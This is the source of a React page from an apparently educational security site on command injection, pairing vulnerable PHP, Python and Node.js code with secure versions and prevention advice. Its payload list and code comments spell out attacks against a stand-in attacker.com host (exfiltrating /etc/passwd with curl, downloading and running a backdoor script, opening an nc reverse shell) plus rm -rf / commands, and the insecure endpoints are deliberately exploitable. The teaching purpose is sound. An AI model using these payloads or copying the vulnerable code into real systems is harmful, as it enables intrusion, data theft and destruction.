import React from 'react';
import { Terminal } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon, Shield } from 'lucide-react';
const CommandInjection: React.FC = () => {
  return <section id="cmd-injection" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Command Injection</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            Command injection occurs when an application passes unsafe user-supplied data to a system shell. 
            Attackers can inject operating system commands to execute arbitrary code on the host server,
            potentially leading to complete system compromise, data theft, or service disruption.
            This vulnerability is especially severe as it often provides attackers with the same privileges
            as the application running the command, and in worst cases, can lead to full server takeover.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker&apos;s Goal</AlertTitle>
            <AlertDescription>
              Execute arbitrary operating system commands on the server to gain unauthorized access, steal sensitive data,
              install backdoors, pivot to other systems, or completely compromise the hosting infrastructure.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Common Command Injection Attack Vectors</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard title="OS Command Execution" description="Direct execution of shell commands through functions like system(), exec(), or shell_exec() with user-controlled input parameters." severity="high" />
            <SecurityCard title="Path Traversal + Command" description="Combining directory traversal with command injection to access and execute commands in different parts of the filesystem." severity="high" />
            <SecurityCard title="Blind Command Injection" description="Command injection where the output is not directly visible, requiring time delays or out-of-band techniques to confirm execution." severity="medium" />
            <SecurityCard title="Filter Bypass Techniques" description="Using encoding, alternative command separators, or shell features to bypass weak input validation and blacklist filters." severity="medium" />
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Network Utilities:</strong> Ping, traceroute, nslookup, whois functionality</li>
              <li><strong>File Operations:</strong> File upload, compression, conversion, and processing utilities</li>
              <li><strong>System Diagnostics:</strong> Health checks, log viewers, and system monitoring tools</li>
              <li><strong>Data Processing:</strong> Report generation, data export/import, and backup utilities</li>
              <li><strong>Development Tools:</strong> Code compilation, version control, and deployment scripts</li>
              <li><strong>Administrative Interfaces:</strong> System configuration, user management, and maintenance tools</li>
              <li><strong>Third-party Integrations:</strong> API calls to external services requiring shell commands</li>
            </ul>
          </div>
        </div>

        {/* Why These Attacks Work */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Why Command Injection Attacks Work</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Technical Weaknesses</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Direct user input concatenation into shell commands</li>
                <li>Insufficient input validation and sanitization</li>
                <li>Improper use of shell metacharacters and operators</li>
                <li>Applications running with excessive privileges</li>
                <li>Lack of proper command parameter separation</li>
                <li>Inadequate output encoding and error handling</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Implementation Flaws</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Using shell execution functions instead of safer alternatives</li>
                <li>Blacklist-based filtering instead of whitelisting</li>
                <li>Poor understanding of shell command syntax and behavior</li>
                <li>Mixing user data with system command structures</li>
                <li>Inadequate testing of edge cases and malicious inputs</li>
                <li>Failure to implement defense-in-depth strategies</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Step-by-Step Attack Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Attack Methodology</h4>
          <Tabs defaultValue="discovery">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="discovery">Discovery</TabsTrigger>
              <TabsTrigger value="testing">Testing</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="persistence">Persistence</TabsTrigger>
            </TabsList>
            
            <TabsContent value="discovery" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Command Injection Discovery</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Identify Command Execution Points:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Look for functionality that might use system commands</li>
                      <li>Test network utilities (ping, nslookup, traceroute)</li>
                      <li>Check file processing and administrative features</li>
                      <li>Examine any system diagnostic or monitoring tools</li>
                    </ul>
                  </li>
                  <li><strong>Input Vector Analysis:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Test form fields, URL parameters, and HTTP headers</li>
                      <li>Check file upload names and content</li>
                      <li>Analyze JSON, XML, and other structured data inputs</li>
                      <li>Examine cookie values and session data</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="testing" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Vulnerability Testing</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Testing Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Command Separator Injection:</strong> Test ; && || | operators</li>
                    <li><strong>Command Substitution:</strong> Try backtick and dollar-parentheses syntax</li>
                    <li><strong>Time-based Detection:</strong> Use sleep/ping commands for blind injection</li>
                    <li><strong>Error-based Detection:</strong> Inject invalid commands to trigger errors</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Command Injection Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exploitation Steps:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Command Confirmation:</strong> Execute harmless commands to verify injection</li>
                    <li><strong>System Reconnaissance:</strong> Gather information about the target system</li>
                    <li><strong>File System Access:</strong> Read, write, and modify files on the server</li>
                    <li><strong>Network Connectivity:</strong> Test outbound connections and data exfiltration</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="persistence" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Persistence and Escalation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Advanced Exploitation:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Reverse Shell Establishment:</strong> Create persistent command and control channels</li>
                    <li><strong>Privilege Escalation:</strong> Attempt to gain higher system privileges</li>
                    <li><strong>Backdoor Installation:</strong> Install persistent access mechanisms</li>
                    <li><strong>Lateral Movement:</strong> Pivot to other systems in the network</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Common Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Command Injection Payloads</h4>
          <CodeExample language="bash" isVulnerable={true} title="Basic Command Injection Payloads" code={`# Command separators - execute additional commands
; whoami
&& whoami
|| whoami
| whoami

# Command substitution - execute commands within other commands
\`whoami\`
$(whoami)

# Time-based detection (blind injection)
; sleep 10
&& ping -c 10 127.0.0.1
|| timeout 10

# File system access
; cat /etc/passwd
&& ls -la /
|| find / -name "*.conf" 2>/dev/null

# Network connectivity testing
; ping -c 1 attacker.com
&& wget http://attacker.com/test
|| curl http://attacker.com/callback

# Information gathering
; uname -a
&& ps aux
|| netstat -tulpn

# Error-based detection
; invalidcommand123
&& /nonexistent/path
|| ''

# Output redirection and file operations
; echo "backdoor" > /tmp/test.txt
&& cat /etc/passwd > /tmp/passwd.txt
|| ls -la / >> /tmp/files.txt`} />
        </div>

        {/* Vulnerable Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
          <CodeExample language="php" isVulnerable={true} title="Vulnerable PHP Command Injection" code={`<?php
// VULNERABLE: Direct user input in shell commands
function pingHost($host) {
    // User input directly concatenated into command
    $command = "ping -c 4 " . $host;
    return shell_exec($command);
}

// Usage in web application
if (isset($_POST['target'])) {
    $result = pingHost($_POST['target']);
    echo "<pre>" . htmlspecialchars($result) . "</pre>";
}

// Attacker payload: 127.0.0.1; cat /etc/passwd
// Resulting command: ping -c 4 127.0.0.1; cat /etc/passwd

// VULNERABLE: File processing with user input
function convertImage($filename, $format) {
    // Direct concatenation creates command injection
    $command = "convert " . $filename . " output." . $format;
    exec($command, $output, $return_code);
    
    if ($return_code === 0) {
        return "Conversion successful";
    } else {
        return "Conversion failed";
    }
}

// Attacker payload for filename: "image.jpg; rm -rf /"
// Resulting command: convert image.jpg; rm -rf / output.png

// VULNERABLE: Log file viewer
function viewLogFile($logfile) {
    // User controls which log file to view
    $command = "tail -n 100 /var/log/" . $logfile;
    return shell_exec($command);
}

// Attacker payload: "../../../etc/passwd; whoami #"
// Resulting command: tail -n 100 /var/log/../../../etc/passwd; whoami #
?>`} />
          
          <CodeExample language="python" isVulnerable={true} title="Vulnerable Python Command Injection" code={`import subprocess
import os
from flask import Flask, request

app = Flask(__name__)

# VULNERABLE: Using shell=True with user input
@app.route('/ping', methods=['POST'])
def ping_host():
    host = request.form.get('host', '')
    
    # VULNERABLE: Direct string concatenation with shell=True
    command = f"ping -c 4 {host}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    return f"<pre>{result.stdout}</pre>"

# VULNERABLE: Using os.system with user input
@app.route('/nslookup', methods=['POST'])
def dns_lookup():
    domain = request.form.get('domain', '')
    
    # VULNERABLE: os.system with user-controlled input
    command = f"nslookup {domain}"
    os.system(command)
    
    return "DNS lookup completed"

# VULNERABLE: File compression utility
@app.route('/compress', methods=['POST'])
def compress_files():
    filename = request.form.get('filename', '')
    compression = request.form.get('compression', 'zip')
    
    # VULNERABLE: User controls both filename and compression type
    if compression == 'zip':
        command = f"zip -r archive.zip {filename}"
    elif compression == 'tar':
        command = f"tar -czf archive.tar.gz {filename}"
    else:
        return "Unsupported compression format"
    
    subprocess.run(command, shell=True)
    return "Compression completed"

# Attacker payloads:
# host: "127.0.0.1; curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)"
# domain: "google.com && wget http://attacker.com/malware.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh"
# filename: "file.txt; rm -rf / #"`} />
          
          <CodeExample language="javascript" isVulnerable={true} title="Vulnerable Node.js Command Injection" code={`const express = require('express');
const { exec } = require('child_process');
const app = express();

app.use(express.urlencoded({ extended: true }));

// VULNERABLE: Direct user input in shell commands
app.post('/ping', (req, res) => {
    const host = req.body.host;
    
    // VULNERABLE: String concatenation with user input
    const command = 'ping -c 4 ' + host;
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send('Error: ' + error.message);
            return;
        }
        res.send('<pre>' + stdout + '</pre>');
    });
});

// VULNERABLE: File processing endpoint
app.post('/process-file', (req, res) => {
    const filename = req.body.filename;
    const action = req.body.action;
    
    let command;
    
    // VULNERABLE: User controls both filename and action
    switch(action) {
        case 'view':
            command = \`cat \${filename}\`;
            break;
        case 'delete':
            command = \`rm \${filename}\`;
            break;
        case 'compress':
            command = \`gzip \${filename}\`;
            break;
        default:
            return res.send('Invalid action');
    }
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send('Error: ' + error.message);
        } else {
            res.send('Operation completed: ' + stdout);
        }
    });
});

// VULNERABLE: System information endpoint
app.get('/system-info', (req, res) => {
    const info_type = req.query.type;
    
    // VULNERABLE: User controls which system command to run
    const commands = {
        'cpu': 'cat /proc/cpuinfo',
        'memory': 'free -h',
        'disk': 'df -h',
        'processes': 'ps aux',
        'custom': req.query.command // Extremely dangerous!
    };
    
    const command = commands[info_type];
    
    if (command) {
        exec(command, (error, stdout, stderr) => {
            res.send('<pre>' + (stdout || stderr) + '</pre>');
        });
    } else {
        res.send('Invalid info type');
    }
});

// Attacker payloads:
// host: "127.0.0.1; nc attacker.com 4444 -e /bin/bash"
// filename: "test.txt; curl http://attacker.com/exfil -d @/etc/passwd"
// type=custom&command=whoami; cat /etc/shadow`} />
        </div>

        {/* Secure Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Secure Code Examples</h4>
          
          <CodeExample language="php" isVulnerable={false} title="Secure PHP Implementation" code={`<?php
// SECURE: Proper input validation and parameterized execution
function pingHostSecure($host) {
    // 1. Input validation - only allow valid IP addresses and hostnames
    if (!filter_var($host, FILTER_VALIDATE_IP) && 
        !filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
        throw new InvalidArgumentException("Invalid host format");
    }
    
    // 2. Use escapeshellarg to properly escape parameters
    $escapedHost = escapeshellarg($host);
    
    // 3. Use exec with explicit command and parameters
    $command = "ping";
    $args = ["-c", "4", $escapedHost];
    $fullCommand = $command . " " . implode(" ", $args);
    
    $output = [];
    $returnCode = 0;
    exec($fullCommand, $output, $returnCode);
    
    return [
        'success' => ($returnCode === 0),
        'output' => $output
    ];
}

// SECURE: File processing with strict validation
function convertImageSecure($filename, $format) {
    // 1. Whitelist allowed file extensions
    $allowedFormats = ['jpg', 'png', 'gif', 'bmp'];
    if (!in_array(strtolower($format), $allowedFormats)) {
        throw new InvalidArgumentException("Unsupported format");
    }
    
    // 2. Validate filename against path traversal
    $basename = basename($filename);
    if ($basename !== $filename || strpos($filename, '..') !== false) {
        throw new InvalidArgumentException("Invalid filename");
    }
    
    // 3. Use array syntax to avoid shell interpretation
    $cmd = [
        'convert',
        escapeshellarg($filename),
        escapeshellarg("output." . $format)
    ];
    
    $output = [];
    $returnCode = 0;
    exec(implode(' ', $cmd), $output, $returnCode);
    
    return ($returnCode === 0) ? "Conversion successful" : "Conversion failed";
}

// SECURE: Log viewer with strict path validation
function viewLogFileSecure($logfile) {
    // 1. Whitelist allowed log files
    $allowedLogs = ['access.log', 'error.log', 'system.log'];
    if (!in_array($logfile, $allowedLogs)) {
        throw new InvalidArgumentException("Unauthorized log file");
    }
    
    // 2. Construct safe path
    $logPath = '/var/log/' . $logfile;
    
    // 3. Verify file exists and is readable
    if (!is_readable($logPath)) {
        throw new RuntimeException("Log file not accessible");
    }
    
    // 4. Use file operations instead of shell commands when possible
    return file_get_contents($logPath, false, null, -1000); // Last 1000 chars
}
?>`} />

          <CodeExample language="python" isVulnerable={false} title="Secure Python Implementation" code={`import subprocess
import ipaddress
import re
import shlex
from flask import Flask, request
from pathlib import Path

app = Flask(__name__)

# SECURE: Ping implementation with proper validation
@app.route('/ping', methods=['POST'])
def ping_host_secure():
    host = request.form.get('host', '').strip()
    
    # 1. Validate input format (IP address or valid hostname)
    try:
        # Try to parse as IP address
        ipaddress.ip_address(host)
    except ValueError:
        # If not IP, validate as hostname
        hostname_pattern = re.compile(
            r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
        )
        if not hostname_pattern.match(host) or len(host) > 253:
            return "Invalid host format", 400
    
    # 2. Use subprocess with list arguments (no shell=True)
    try:
        result = subprocess.run(
            ['ping', '-c', '4', host],  # List prevents injection
            capture_output=True,
            text=True,
            timeout=10  # Prevent hanging
        )
        return f"<pre>{result.stdout}</pre>"
    except subprocess.TimeoutExpired:
        return "Ping timeout", 408
    except Exception as e:
        return "Ping failed", 500

# SECURE: File compression with validation
@app.route('/compress', methods=['POST'])
def compress_files_secure():
    filename = request.form.get('filename', '').strip()
    compression = request.form.get('compression', 'zip')
    
    # 1. Validate compression type (whitelist)
    allowed_compressions = ['zip', 'tar']
    if compression not in allowed_compressions:
        return "Unsupported compression format", 400
    
    # 2. Validate filename (no path traversal, only alphanumeric + safe chars)
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename) or '..' in filename:
        return "Invalid filename", 400
    
    # 3. Check if file exists and is in allowed directory
    file_path = Path('./uploads') / filename
    if not file_path.exists() or not file_path.is_file():
        return "File not found", 404
    
    # 4. Use subprocess with argument list
    try:
        if compression == 'zip':
            subprocess.run(['zip', '-r', 'archive.zip', str(file_path)], 
                         check=True, timeout=30)
        elif compression == 'tar':
            subprocess.run(['tar', '-czf', 'archive.tar.gz', str(file_path)], 
                         check=True, timeout=30)
        
        return "Compression completed successfully"
    except subprocess.CalledProcessError:
        return "Compression failed", 500
    except subprocess.TimeoutExpired:
        return "Compression timeout", 408

# SECURE: System information with predefined commands
@app.route('/system-info', methods=['GET'])
def system_info_secure():
    info_type = request.args.get('type', '')
    
    # 1. Predefined command mapping (no user input in commands)
    commands = {
        'cpu': ['cat', '/proc/cpuinfo'],
        'memory': ['free', '-h'],
        'disk': ['df', '-h'],
        'processes': ['ps', 'aux']
    }
    
    if info_type not in commands:
        return "Invalid info type", 400
    
    # 2. Execute predefined command
    try:
        result = subprocess.run(
            commands[info_type],
            capture_output=True,
            text=True,
            timeout=10
        )
        return f"<pre>{result.stdout}</pre>"
    except Exception:
        return "Command failed", 500`} />

          <CodeExample language="javascript" isVulnerable={false} title="Secure Node.js Implementation" code={`const express = require('express');
const { spawn, execFile } = require('child_process');
const { promisify } = require('util');
const path = require('path');
const fs = require('fs').promises;
const validator = require('validator');

const app = express();
app.use(express.urlencoded({ extended: true }));

// SECURE: Ping implementation with validation
app.post('/ping', async (req, res) => {
    const host = req.body.host?.trim();
    
    if (!host) {
        return res.status(400).send('Host parameter required');
    }
    
    // 1. Validate input (IP address or hostname)
    const isValidIP = validator.isIP(host);
    const isValidDomain = validator.isFQDN(host, { require_tld: false });
    
    if (!isValidIP && !isValidDomain) {
        return res.status(400).send('Invalid host format');
    }
    
    // 2. Use spawn with argument array (safer than exec)
    const ping = spawn('ping', ['-c', '4', host]);
    let output = '';
    let errorOutput = '';
    
    ping.stdout.on('data', (data) => {
        output += data.toString();
    });
    
    ping.stderr.on('data', (data) => {
        errorOutput += data.toString();
    });
    
    ping.on('close', (code) => {
        if (code === 0) {
            res.send(\`<pre>\${output}</pre>\`);
        } else {
            res.status(500).send('Ping failed');
        }
    });
    
    // Timeout after 10 seconds
    setTimeout(() => {
        ping.kill();
        res.status(408).send('Ping timeout');
    }, 10000);
});

// SECURE: File processing with strict validation
app.post('/process-file', async (req, res) => {
    const filename = req.body.filename?.trim();
    const action = req.body.action?.trim();
    
    // 1. Validate action (whitelist)
    const allowedActions = ['view', 'compress'];
    if (!allowedActions.includes(action)) {
        return res.status(400).send('Invalid action');
    }
    
    // 2. Validate filename (alphanumeric + safe characters only)
    if (!/^[a-zA-Z0-9._-]+$/.test(filename) || filename.includes('..')) {
        return res.status(400).send('Invalid filename');
    }
    
    // 3. Construct safe file path
    const filePath = path.join('./uploads', filename);
    
    try {
        // 4. Check file exists
        await fs.access(filePath);
        
        if (action === 'view') {
            // Use fs operations instead of shell commands when possible
            const content = await fs.readFile(filePath, 'utf8');
            res.send(\`<pre>\${content}</pre>\`);
        } else if (action === 'compress') {
            // Use execFile with specific arguments
            const execFilePromise = promisify(execFile);
            await execFilePromise('gzip', ['-c', filePath]);
            res.send('File compressed successfully');
        }
    } catch (error) {
        res.status(500).send('Operation failed');
    }
});

// SECURE: System information with predefined commands
app.get('/system-info', (req, res) => {
    const infoType = req.query.type;
    
    // 1. Predefined command mapping
    const commands = {
        'cpu': { cmd: 'cat', args: ['/proc/cpuinfo'] },
        'memory': { cmd: 'free', args: ['-h'] },
        'disk': { cmd: 'df', args: ['-h'] },
        'processes': { cmd: 'ps', args: ['aux'] }
    };
    
    if (!commands[infoType]) {
        return res.status(400).send('Invalid info type');
    }
    
    // 2. Execute with spawn (argument separation)
    const { cmd, args } = commands[infoType];
    const process = spawn(cmd, args);
    let output = '';
    
    process.stdout.on('data', (data) => {
        output += data.toString();
    });
    
    process.on('close', (code) => {
        if (code === 0) {
            res.send(\`<pre>\${output}</pre>\`);
        } else {
            res.status(500).send('Command failed');
        }
    });
});

// Input validation middleware
const validateInput = (req, res, next) => {
    // Add CSRF protection, rate limiting, etc.
    next();
};

app.use(validateInput);`} />
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Prevention and Mitigation Strategies</h4>
          
          <Alert className="mb-6">
            <Shield className="h-4 w-4" />
            <AlertTitle>Defense in Depth Approach</AlertTitle>
            <AlertDescription>
              Implement multiple layers of security controls to prevent command injection attacks.
              No single control should be relied upon alone.
            </AlertDescription>
          </Alert>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div className="p-4 rounded-md border border-green-200 dark:border-green-800 bg-cybr-muted">
              <h5 className="font-semibold mb-3 text-green-800 dark:text-green-200">Primary Controls</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>Avoid Shell Execution:</strong> Use language-specific libraries instead of shell commands</li>
                <li><strong>Input Validation:</strong> Strict whitelist validation for all user inputs</li>
                <li><strong>Parameterized Execution:</strong> Use argument arrays instead of string concatenation</li>
                <li><strong>Escape Shell Arguments:</strong> Use proper escaping functions when shell execution is necessary</li>
                <li><strong>Principle of Least Privilege:</strong> Run applications with minimal required permissions</li>
              </ul>
            </div>
            
            <div className="p-4 rounded-md border border-blue-200 dark:border-blue-800 bg-cybr-muted">
              <h5 className="font-semibold mb-3 text-blue-800 dark:text-blue-200">Secondary Controls</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>Sandboxing:</strong> Isolate command execution in restricted environments</li>
                <li><strong>Web Application Firewall:</strong> Filter malicious command injection attempts</li>
                <li><strong>Runtime Application Security:</strong> Monitor and block suspicious command execution</li>
                <li><strong>Logging and Monitoring:</strong> Track all command executions for security analysis</li>
                <li><strong>Regular Security Testing:</strong> Automated and manual testing for command injection</li>
              </ul>
            </div>
          </div>

          <CodeExample language="javascript" isVulnerable={false} title="Secure Development Guidelines" code={`// 1. PREFERRED: Use native language features instead of shell commands
const fs = require('fs').promises;
const path = require('path');

// Instead of: exec('ls ' + directory)
async function listFiles(directory) {
    try {
        const files = await fs.readdir(directory);
        return files;
    } catch (error) {
        throw new Error('Directory listing failed');
    }
}

// 2. WHEN SHELL IS NECESSARY: Use argument arrays
const { spawn } = require('child_process');

function pingHost(host) {
    // SECURE: Arguments are separated, no shell interpretation
    return new Promise((resolve, reject) => {
        const ping = spawn('ping', ['-c', '4', host]);
        // Handle output...
    });
}

// 3. INPUT VALIDATION: Comprehensive validation functions
function validateIPAddress(ip) {
    const ipPattern = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return ipPattern.test(ip);
}

function validateHostname(hostname) {
    const hostnamePattern = /^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$/;
    return hostnamePattern.test(hostname) && hostname.length <= 253;
}

// 4. SECURITY MIDDLEWARE: Request validation
function validateCommandInput(req, res, next) {
    const { host } = req.body;
    
    if (!host || (!validateIPAddress(host) && !validateHostname(host))) {
        return res.status(400).json({ error: 'Invalid host format' });
    }
    
    next();
}

// 5. CONFIGURATION: Security headers and settings
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});`} />
        </div>

        {/* Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Testing Tools and Techniques</h4>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
            <SecurityCard title="Manual Testing" description="Manual payload injection using browser dev tools, Burp Suite, or OWASP ZAP for comprehensive testing." severity="medium" />
            <SecurityCard title="Automated Scanners" description="Tools like Nikto, SQLmap, and custom scripts for automated command injection detection." severity="medium" />
            <SecurityCard title="Code Analysis" description="Static analysis tools (SonarQube, Checkmarx) and code review to identify vulnerable patterns." severity="low" />
          </div>
        </div>
      </div>
    </section>;
};
export default CommandInjection;